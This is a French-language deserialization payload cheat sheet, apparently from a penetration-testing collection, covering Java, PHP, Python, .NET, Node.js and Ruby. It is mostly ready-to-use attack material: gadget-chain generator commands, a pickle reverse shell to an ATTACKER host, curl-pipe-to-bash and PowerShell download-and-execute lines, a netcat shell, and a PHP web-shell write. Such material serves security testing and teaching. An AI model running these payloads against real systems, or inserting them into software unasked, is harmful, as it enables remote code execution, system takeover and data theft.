# 🔓 Charges utiles de désérialisation

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Précisions de lecture :** Les chaînes dépendent des versions des bibliothèques et des classes réellement disponibles. Depuis PHP 8, les métadonnées Phar ne sont plus automatiquement désérialisées à l’ouverture d’une archive ; voir la [migration officielle PHP 8](https://www.php.net/manual/en/migration80.incompatible.php). Les exemples historiques restent inchangés. Les extraits Pickle, YAML et .NET supposent des mécanismes et prérequis propres à leur environnement. Le lien de retour vise le README de Payloads, absent du dépôt source fourni ; aucun fichier de remplacement n’a été inventé.

---

## ☕ Désérialisation Java

### Détection
```
# Octets de signature
AC ED 00 05    # Objet Java sérialisé (Base64 : rO0AB)
H4sIAAAA       # Compressé avec GZip

# Emplacements courants
- Cookies (Base64 encoded)
- Hidden form fields
- ViewState
- API parameters
- RMI (port 1099)
- JMX (port 9010)
```

### ysoserial — générateur de charges utiles
```bash
# Installer
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Générer une charge utile
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Chaînes de gadgets courantes
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Charge utile d’exfiltration DNS
```bash
# Générer une charge utile de rappel DNS
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Détection par DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Bibliothèques vulnérables courantes
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

## 🐘 Désérialisation PHP

### Méthodes magiques
```php
__construct()    // Création de l’objet
__destruct()     // Destruction de l’objet
__wakeup()       // Désérialisation
__sleep()        // Sérialisation
__toString()     // Conversion de l’objet en chaîne
__call()         // Méthode inaccessible
__get()          // Lecture d’une propriété inaccessible
__set()          // Écriture d’une propriété inaccessible
```

### Charge utile de base
```php
// Format d’un objet sérialisé
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Objet avec propriétés
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Tableau
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Conversions implicites de types (type juggling)
```php
// Contournement avec le booléen true
O:4:"User":1:{s:8:"password";b:1;}

// Comparaison avec l’entier 0
O:4:"User":1:{s:8:"password";i:0;}

// Contournement par comparaison de tableaux
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Charges utiles de chaînes POP
```php
// Écriture arbitraire de fichier
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Exécution de commandes via __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC — chaînes de gadgets PHP
```bash
# Installer
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Lister les gadgets
./phpggc -l

# Générer une charge utile
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Encoder en Base64
./phpggc -b Laravel/RCE1 system "id"

# Encoder pour une URL
./phpggc -u Laravel/RCE1 system "id"

# Avec le wrapper PHAR
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Désérialisation Phar
```php
// L’accès à un fichier Phar peut déclencher une désérialisation selon la version
phar://path/to/phar.phar/internal-file

// Méthodes d’accès utilisant phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

## 🐍 Désérialisation Python (Pickle)

### Charge utile de base
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Charge utile de shell inversé
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Détection
```
# Octets de signature
80 04 95    # Protocole 4 (Python 3)
80 03       # Protocole 3
80 02       # Protocole 2

# Motifs Base64 courants
gASV        # Protocole 4
gAN         # Protocole 3
```

### Désérialisation YAML (Python)
```yaml
# Chargement non sécurisé avec PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Plusieurs commandes
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

## 🔷 Désérialisation .NET

### Détection
```
# ViewState
__VIEWSTATE parameter (Base64)

# BinaryFormatter
AAEAAAD/////    # Signature Base64

# JSON.NET
$type field in JSON
```

### ysoserial.net — générateur de charges utiles
```powershell
# Télécharger
# https://github.com/pwntester/ysoserial.net

# Générer une charge utile
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Gadgets courants
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Exploitation de ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Code vulnérable : unserialize(user_input)
// Charge utile avec IIFE (expression de fonction immédiatement invoquée)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Shell inversé
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Si eval() est utilisé sur les données désérialisées
(function(){require('child_process').execSync('id')})()
```

---

## 🔴 Désérialisation Ruby

### Marshal.load
```ruby
# Créer une charge utile
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

## 📋 Liste de contrôle des tests

```markdown
□ Identifier le format de sérialisation (Base64, hexadécimal, octets de signature)
□ Déterminer le langage ou framework (Java, PHP, Python, .NET)
□ Rechercher des versions vulnérables des bibliothèques
□ Générer les charges utiles avec l’outil adapté
□ Tester à l’aveugle avec des rappels DNS/HTTP
□ Tester la lecture et l’écriture de fichiers
□ Tester l’exécution de code
□ Essayer différentes chaînes de gadgets
□ Contourner les filtres (encodage, compression)
```

---

## 🔗 Récapitulatif des outils

|Langage|Outil|Utilisation|
|----------|------|-------|
|**Java**|ysoserial|`java -jar ysoserial.jar GADGET "cmd"`|
|**PHP**|PHPGGC|`./phpggc GADGET system "cmd"`|
|**Python**|Personnalisé|`pickle.dumps(Exploit())`|
|**.NET**|ysoserial.net|`ysoserial.exe -g GADGET -f FORMAT -c "cmd"`|
|**Ruby**|Personnalisé|Création manuelle de charges utiles|

---

## 🔗 Charges utiles connexes

- [Charges utiles SSTI](./SSTI.fr.md)
- [Injection de commandes](./Command-Injection.fr.md)

---

**Retour aux charges utiles :** [💉 Collection de charges utiles](../../README.md)
